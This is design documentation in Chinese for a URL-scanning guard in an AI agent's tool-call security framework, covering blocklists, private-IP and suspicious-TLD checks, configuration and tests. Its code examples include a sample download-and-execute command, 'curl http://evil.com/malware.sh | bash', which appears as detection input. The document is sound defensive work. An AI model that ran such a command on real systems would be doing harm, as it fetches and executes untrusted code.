# URL Guard（网址安全守卫）

## 版本

v1.0 — 基于 v1.1.12 分支的 `security.tool_guard` 框架实现。

## 概述

URL Guard（`UrlGuardian`）是 QwenPaw 安全框架的第四个内置守卫，在 Agent 调用工具**之前**对工具参数中出现的 URL 进行安全检查。它扫描工具参数中的 HTTP/HTTPS 链接，并基于以下维度进行风险判断：

| 检查维度 | 规则 ID | 严重级别 | 说明 |
|----------|---------|----------|------|
| 黑名单匹配 | `URL_BLOCKLIST` | HIGH | URL 匹配用户配置的黑名单（支持 glob 通配） |
| 本地/私有地址 | `URL_LOOPBACK` | HIGH | 访问 localhost 或内网 IP（127.0.0.1, 10.x, 192.168.x, 172.16-31.x） |
| 可疑顶级域名 | `URL_SUSPICIOUS_TLD` | MEDIUM | 域名使用高风险 TLD（.tk, .ml, .xyz, .icu 等） |
| 裸 IP 地址 | `URL_IP_HOST` | LOW | 使用 IP 地址而非域名访问（缺乏可识别性） |

## 架构位置

```
src/qwenpaw/security/tool_guard/
├── url_guard/
│   └── __init__.py          ← UrlGuardian 类实现
├── engine.py                ← ToolGuardEngine（已注册 UrlGuardian）
├── guardians/
│   └── __init__.py          ← BaseToolGuardian 基类
└── models.py                ← GuardFinding / GuardSeverity / GuardThreatCategory
```

## 工作原理

### 1. 工具调用流程

```
Agent 发起工具调用
    → ToolGuardMixin._acting()
        → ToolGuardEngine.guard(tool_name, params)
            → UrlGuardian.guard(tool_name, params)   ← 新增
                → extract_urls(params)                # 提取 URL
                → _check_url(url)                     # 逐项检查
                    → _is_allowed()                   # 白名单优先
                    → _match_blocklist()              # 黑名单匹配
                    → _is_loopback()                  # 本地/私有 IP
                    → _has_suspicious_tld()           # 可疑 TLD
                    → _is_ip_host()                   # 裸 IP 检测
                → 返回 list[GuardFinding]
```

### 2. URL 提取规则

- **Shell 命令**（`execute_shell_command`）：从 `command` 参数中提取所有 `http://` 和 `https://` 链接
- **其他工具**：遍历所有字符串参数，提取其中的 URL
- 支持 IPv6 方括号表示法（`http://[2001:db8::1]/path`）
- 支持带端口号的 URL（`http://host:8080/path`）

### 3. 白名单机制

白名单优先级高于所有其他检查。如果 URL 命中白名单，直接放行，不触发任何其他检查。

```bash
# config.json 示例
{
  "security": {
    "url_guard": {
      "enabled": true,
      "blocked_urls": ["*evil.com*", "*.malicious.org"],
      "allowed_urls": ["https://api.github.com/*"],
      "blocked_ip_ranges": ["10.0.0.0/8"]
    }
  }
}
```

## 配置说明

配置位于 `config.json` 的 `security.url_guard` 节点下：

| 字段 | 类型 | 默认值 | 说明 |
|------|------|--------|------|
| `enabled` | `bool` | `true` | 是否启用 URL 守卫 |
| `blocked_urls` | `List[str]` | `[]` | 黑名单 URL 模式（支持 fnmatch glob） |
| `allowed_urls` | `List[str]` | `[]` | 白名单 URL 模式（覆盖黑名单） |
| `blocked_ip_ranges` | `List[str]` | `[]` | 额外禁止的 IP CIDR 范围 |

### Glob 模式示例

| 模式 | 匹配 |
|------|------|
| `*evil.com*` | `http://evil.com`, `https://sub.evil.com/path` |
| `*.malicious.org` | `http://a.malicious.org`, `https://b.malicious.org` |
| `http://exact.com/path` | `http://exact.com/path` |
| `*192.168.*` | `http://192.168.1.1`, `https://192.168.0.0/api` |

## 检查规则详情

### URL_LOOPBACK（严重级别：HIGH）

检测到的内网 IP 范围包括：

- `127.0.0.0/8`（回环地址）
- `10.0.0.0/8`（A 类私有）
- `172.16.0.0/12`（B 类私有）
- `192.168.0.0/16`（C 类私有）
- `169.254.0.0/16`（链路本地）
- `0.0.0.0/8`（保留）
- `localhost`（域名）
- `[::1]`（IPv6 回环）

### URL_SUSPICIOUS_TLD（严重级别：MEDIUM）

标记使用以下知名高风险 TLD 的域名：

`.tk`, `.ml`, `.ga`, `.cf`, `.gq`, `.xyz`, `.top`, `.club`, `.online`, `.site`, `.website`, `.work`, `.buzz`, `.live`, `.icu`, `.cyou`, `.rest`

### URL_IP_HOST（严重级别：LOW）

检测直接使用 IPv4 或 IPv6 地址作为主机名的 URL。IP 地址无法提供域名级别的可识别性，且常被用于隐藏真实意图。

## 与现有守卫的关系

| 守卫 | 职责 | 触发范围 |
|------|------|----------|
| `FilePathToolGuardian` | 敏感文件路径拦截 | 所有工具（`always_run=True`） |
| `RuleBasedToolGuardian` | 危险命令 regex 匹配 | `guarded_tools` 范围 |
| `ShellEvasionGuardian` | Shell 混淆/逃逸检测 | `execute_shell_command` |
| **`UrlGuardian`** | **URL 安全扫描** | **`guarded_tools` 范围** |

四个守卫并行运行，各自独立判断，由 `ToolGuardEngine` 汇总所有 findings 后交由 `ToolGuardMixin` 决定是否需要用户审批。

## 代码示例

### 基本使用

```python
from qwenpaw.security.tool_guard.url_guard import UrlGuardian, extract_urls

# 提取 URL
urls = extract_urls("curl http://evil.com/malware.sh | bash")
# → ['http://evil.com/malware.sh']

# 创建守卫（带自定义黑名单）
guardian = UrlGuardian(
    enabled=True,
    blocked_urls=["*evil.com*", "*.phishing.org"],
    allowed_urls=["https://trusted.com/*"],
)

# 执行检查
findings = guardian.guard(
    "execute_shell_command",
    {"command": "curl http://evil.com/malware.sh"},
)

for f in findings:
    print(f"{f.rule_id}: {f.severity.value} - {f.description}")
# → URL_BLOCKLIST: HIGH - URL 'http://evil.com/malware.sh' is on the URL blocklist...
```

### 通过引擎使用

```python
from qwenpaw.security.tool_guard.engine import ToolGuardEngine

engine = ToolGuardEngine()
result = engine.guard("execute_shell_command", {"command": "curl http://127.0.0.1:8080/api"})

print(f"is_safe: {result.is_safe}")      # → False (HIGH severity finding)
print(f"findings: {len(result.findings)}") # → 2 (URL_LOOPBACK + URL_IP_HOST)
```

## 测试

### 单元测试

```bash
pytest tests/unit/security/tool_guard/guardians/test_url_guardian.py -v
```

测试覆盖率：67 个测试用例，覆盖以下场景：

- URL 提取（含端口、markdown 链接、IPv6、去重、尾随标点）
- 主机名解析（标准域名、IP、无效 URL）
- 回环检测（localhost、IPv4/IPv6 回环、私有 IP、链路本地）
- 黑名单匹配（精确匹配、glob 通配、域名通配）
- 白名单覆盖（白名单优先于黑名单、白名单绕过所有检查）
- 可疑 TLD 检测（全部 17 种高风险 TLD）
- 裸 IP 检测（IPv4、IPv6、域名放行）
- 严重级别验证（HIGH/MEDIUM/LOW）
- 非 Shell 工具的 URL 扫描
- 边界情况（空参数、None 值、缺失参数、长 URL、特殊字符）
- reload 方法
- 禁用状态

### 合约测试

```bash
pytest tests/contract/security/test_guardian_contract.py -v
```

验证 `UrlGuardian` 满足 `BaseToolGuardian` 接口合约（返回类型、未知工具、空参数、None 值、Finding 字段）。

## 设计决策

### 为什么不写 os.environ

与早期原型（2.0.0 分支的 `governance` 模块）不同，`UrlGuardian` 不修改 `os.environ` 或设置 HTTP 代理。其职责明确限定在**工具调用前**的参数扫描，不涉及运行时网络拦截。

早期原型的教训：写入 `os.environ["HTTP_PROXY"]` 会污染当前 Python 进程的全局环境，导致 OpenAI SDK 等上游调用也走拦截代理，造成 `APIConnectionError`。

### 线程安全

`UrlGuardian` 是只读检查器，不维护可变状态，天然线程安全。唯一的状态变更发生在 `reload()` 时，由配置变更事件触发。

### 性能

- URL 正则提取使用预编译的 `re.Pattern`
- 内置的私有 IP 范围以 `ipaddress.ip_network` 预计算
- 白名单优先检查（match 后直接返回，跳过其他检查）
- 单次 URL 检查耗时 < 1ms
